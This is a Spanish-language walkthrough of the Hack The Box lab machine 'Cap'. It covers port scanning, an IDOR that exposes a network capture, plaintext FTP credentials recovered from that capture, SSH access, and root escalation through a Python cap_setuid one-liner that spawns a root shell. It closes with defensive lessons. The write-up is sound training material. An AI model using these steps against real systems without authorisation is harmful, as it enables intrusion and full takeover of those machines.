#  Cap - Hack The Box

**Sistema Operativo:** Linux 🐧  
**Dificultad:** Easy 
**Dirección IP:** 10.129.26.108  

## Contexto
Cap es una máquina Linux de dificultad fácil que se centra en conceptos fundamentales de seguridad web y administración de sistemas. La ruta de explotación comienza identificando una vulnerabilidad de **IDOR** (Insecure Direct Object Reference) en un panel de control web, lo que permite descargar un archivo de captura de red (PCAP). Analizando el tráfico, extraemos credenciales en texto plano que nos dan acceso por SSH. Finalmente, la escalada a `root` se logra explotando una mala configuración en las **Capabilities**  del sistema operativo asignadas al binario de Python.

---

##  Fase de Reconocimiento 

Iniciamos comprobando la conexión y el sistema operativo de la máquina mediante el envío de un paquete ICMP.

```bash
ping  4 10.129.26.108
```
El TTL de respuesta es cercano a 64, lo que confirma que estamos ante un entorno Linux.

Ejecutamos nuestro escaneo estándar con Nmap para descubrir todos los puertos abiertos y enumerar las versiones de los servicios expuestos.

```bash
nmap -p- --open -sV -sC --min-rate 5000 10.129.26.108 -oN escaneo_inicial.txt
```

 ## Resultado del escaneo

 PuertoProtocoloEstadoServicioNotas / Versión21TCPAbierto FTPvsftpd 3.0.322TCPAbierto SSHOpenSSH 8.2p1 Ubuntu80TCPAbierto HTTPgunicorn

**Conclusión del Reconocimiento**: Tenemos tres vías potenciales. FTP y SSH usualmente requieren credenciales. El puerto 80  aloja una aplicación web, por lo que será nuestro vector de entrada principal para buscar vulnerabilidades.

**Enumeración Web y vulnerabilidad IDOR**
Al visitar http://10.129.26.108 en el navegador, encontramos un panel de control que muestra estadísticas de red y eventos de seguridad.

Navegando por el menú lateral, hay una sección llamada "Security Snapshot" que nos redirige a una URL con un número al final, por ejemplo: http://10.129.26.108/data/1. En esta página hay un botón para descargar un archivo .pcap.

Dado que la URL utiliza un identificador numérico predecible (/data/1), intentamos modificarlo a /data/0 para comprobar si existe una vulnerabilidad de IDOR.


```bash
URL Modificada: [http://10.129.26.108/data/0](http://10.129.26.108/data/0)
```

El servidor nos permite acceder a esta captura antigua que no nos pertenecía y procedemos a descargar el archivo**0 pcap.**

**Análisis del tráfico de red (PCAP)**
Abrimos el archivo descargado utilizando Wireshark (o mediante la terminal con tshark) para analizar el tráfico capturado en ese momento.

Filtrando el tráfico por ftp y identificamos un inicio de sesión exitoso donde las credenciales viajaron en texto plano.

Credenciales obtenidas del PCAP:

```bash
Usuario: nathan
Contraseña: Buck3tH0und#ar3s3cur3
```

**Conexión con SSH**
Teniendo en cuenta que los usuarios a menudo reutilizan contraseñas, intentamos conectarnos al puerto 22 (SSH) con estas credenciales.
```bash
ssh nathan@10.129.26.108
```
El acceso es exitoso. Listamos el directorio principal y obtenemos la flag del usuario estándar.
```bash
cat user.txt
```

Una vez dentro de la máquina como el usuario nathan, comenzamos la enumeración interna del sistema buscando vectores para escalar a root.

En lugar de depender inmediatamente de scripts automatizados como linpeas.sh, realizamos búsquedas manuales. Uno de los vectores más comunes en Linux, además de los binarios SUID, son las Capabilities mal configuradas.

Buscamos binarios con capacidades extendidas asignadas recursivamente desde la raíz:
```bash
getcap -r / 2>/dev/null
resultado:  /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

El binario de Python tiene asignada la capability cap_setuid. Esto significa que Python puede cambiar el UID (User ID) de su proceso en ejecución sin necesidad de ser ejecutado con sudo o ser un archivo SUID.

**Explotación de la Capability**
Podemos iniciar Python y usar la librería os para establecer nuestro UID a 0 (el UID de root) y luego generar una consola de comandos interactiva (/bin/bash).

Ejecutamos el siguiente comando en la terminal:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Verificamos nuestros nuevos privilegios:
```bash
whoami
# Resultado: root
```

Navegamos al directorio del administrador y leemos la flag final:
```bash
cd /root
cat root.txt
```

## Conclusiones y Aprendizaje
Prevención de IDOR: Los sistemas no deben confiar únicamente en el identificador proporcionado por el usuario en la URL. Deben implementar controles de acceso en el backend para verificar si el usuario logueado tiene permisos reales para ver ese registro específico.

Peligro de protocolos en texto plano: El uso de FTP no seguro permite la interceptación de tráfico. El archivo de captura (PCAP) demostró cómo un atacante en la red puede leer credenciales si no hay cifrado (como en SFTP).

Auditoría de Capabilities: Asignar cap_setuid a un intérprete potente como Python equivale a otorgar acceso directo a root a cualquier usuario del sistema. El principio de menor privilegio debe aplicarse rigurosamente al configurar entornos Linux.
